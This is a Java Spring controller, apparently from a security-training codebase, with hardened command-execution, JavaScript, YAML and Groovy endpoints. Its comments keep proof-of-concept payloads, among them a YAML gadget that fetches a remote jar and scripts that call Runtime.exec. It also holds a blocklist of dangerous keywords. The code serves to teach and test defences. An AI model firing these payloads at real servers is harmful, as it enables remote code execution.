package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.List;
import org.springframework.web.util.HtmlUtils;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final java.util.Set<String> ALLOWED_COMMANDS = new java.util.HashSet<>(
            Arrays.asList("ls", "whoami", "date", "uname", "id"));
    private static final java.util.regex.Pattern SAFE_ARG_PATTERN =
            java.util.regex.Pattern.compile("^[a-zA-Z0-9/._-]+$");

    private static boolean isAllowedCommand(String[] parts) {
        if (parts == null || parts.length == 0 || !ALLOWED_COMMANDS.contains(parts[0])) {
            return false;
        }
        for (int i = 1; i < parts.length; i++) {
            if (!SAFE_ARG_PATTERN.matcher(parts[i]).matches() || parts[i].contains("..")) {
                return false;
            }
        }
        return true;
    }

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        StringBuilder sb = new StringBuilder();

        try {
            String[] parts = cmd.split("\\s+");
            if (!isAllowedCommand(parts)) {
                return "Command not allowed.";
            }
            ProcessBuilder processBuilder = new ProcessBuilder(parts);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            log.error("Command execution error", e);
            return "An error occurred";
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            String[] parts = cmd.split("\\s+");
            if (!isAllowedCommand(parts)) {
                return "Command not allowed.";
            }
            ProcessBuilder processBuilder = new ProcessBuilder(parts);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            log.error("ProcessBuilder execution error", e);
            return "An error occurred";
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    private static final List<String> ALLOWED_JS_HOSTS = Arrays.asList("cdn.example.com", "static.example.com");

    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // Validate jsurl against allowlist to prevent arbitrary script loading / RCE
        java.net.URI uri;
        try {
            uri = new java.net.URI(jsurl);
        } catch (Exception e) {
            throw new IllegalArgumentException("Invalid URL");
        }
        String host = uri.getHost();
        if (host == null || !ALLOWED_JS_HOSTS.contains(host.toLowerCase())) {
            throw new IllegalArgumentException("JS URL host not allowed: " + host);
        }
        if (!"https".equals(uri.getScheme())) {
            throw new IllegalArgumentException("Only HTTPS JS URLs are allowed");
        }
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        // Remove all Java/Nashorn bridging objects to prevent Java class access / RCE
        bindings.remove("java");
        bindings.remove("javax");
        bindings.remove("Java");
        bindings.remove("Packages");
        bindings.remove("com");
        bindings.remove("org");
        bindings.remove("edu");
        bindings.remove("javafx");
        // Disable Java.type, java.lang, load, loadWithNewGlobal to block eval/class access
        engine.eval("var Java = undefined; var Packages = undefined; var load = undefined; var loadWithNewGlobal = undefined;", bindings);
        // Fetch script content via validated URL and eval as string (no load() which can bypass binding removal)
        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) uri.toURL().openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        conn.setInstanceFollowRedirects(false);
        int status = conn.getResponseCode();
        if (status != 200) {
            throw new IllegalArgumentException("Failed to fetch JS URL: HTTP " + status);
        }
        String scriptContent;
        try (java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(conn.getInputStream(), java.nio.charset.StandardCharsets.UTF_8))) {
            StringBuilder sbScript = new StringBuilder();
            String ln;
            while ((ln = reader.readLine()) != null) {
                sbScript.append(ln).append('\n');
            }
            scriptContent = sbScript.toString();
        }
        engine.eval(scriptContent, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // Only allow safe mathematical/string expressions via strict allowlist
        if (content == null || content.isEmpty()) {
            return;
        }
        // Strict allowlist: only allow simple arithmetic and string expressions
        // Reject any content containing method calls, class references, or dangerous patterns
        if (!content.matches("^[a-zA-Z0-9\\s+\\-*/%().,'\"]+$")) {
            throw new IllegalArgumentException("Expression rejected: only simple arithmetic and string literals are allowed.");
        }
        // Additional blocklist for dangerous Groovy/Java patterns
        String lowerContent = content.toLowerCase();
        if (lowerContent.contains("runtime") || lowerContent.contains("process") ||
            lowerContent.contains("execute") || lowerContent.contains("exec") ||
            lowerContent.contains("class") || lowerContent.contains("system") ||
            lowerContent.contains("thread") || lowerContent.contains("file") ||
            lowerContent.contains("socket") || lowerContent.contains("url") ||
            lowerContent.contains("groovy") || lowerContent.contains("import") ||
            lowerContent.contains("forname") || lowerContent.contains("invoke") ||
            lowerContent.contains("reflect") || lowerContent.contains("shell") ||
            lowerContent.contains("eval") || lowerContent.contains("sleep") ||
            lowerContent.contains("getclass")) {
            throw new IllegalArgumentException("Expression rejected: potentially dangerous pattern detected.");
        }
        SecureASTCustomizer secureAst = new SecureASTCustomizer();
        // Deny all method calls, system exits, package access, and imports to prevent RCE
        secureAst.setMethodDefinitionAllowed(false);
        secureAst.setClosuresAllowed(false);
        secureAst.setPackageAllowed(false);
        secureAst.setIndirectImportCheckEnabled(true);
        secureAst.setImportsWhitelist(Arrays.asList("java.lang.Math", "java.lang.Integer", "java.lang.Double", "java.lang.String"));
        secureAst.setStarImportsWhitelist(java.util.Collections.emptyList());
        secureAst.setStaticImportsWhitelist(java.util.Collections.emptyList());
        secureAst.setStaticStarImportsWhitelist(java.util.Collections.emptyList());
        // Block dangerous receivers: Runtime, ProcessBuilder, System, Class, ClassLoader, Thread
        secureAst.setReceiversBlackList(Arrays.asList(
                "java.lang.Runtime", "java.lang.ProcessBuilder", "java.lang.System",
                "java.lang.Class", "java.lang.ClassLoader", "java.lang.Thread",
                "groovy.lang.GroovyShell", "groovy.lang.GroovyClassLoader",
                "java.io.File", "java.net.URL", "java.net.Socket"));

        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secureAst);
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) {
        // Removed: Runtime.exec() demo invocation
        System.out.println("Rce demo class loaded.");
    }
}

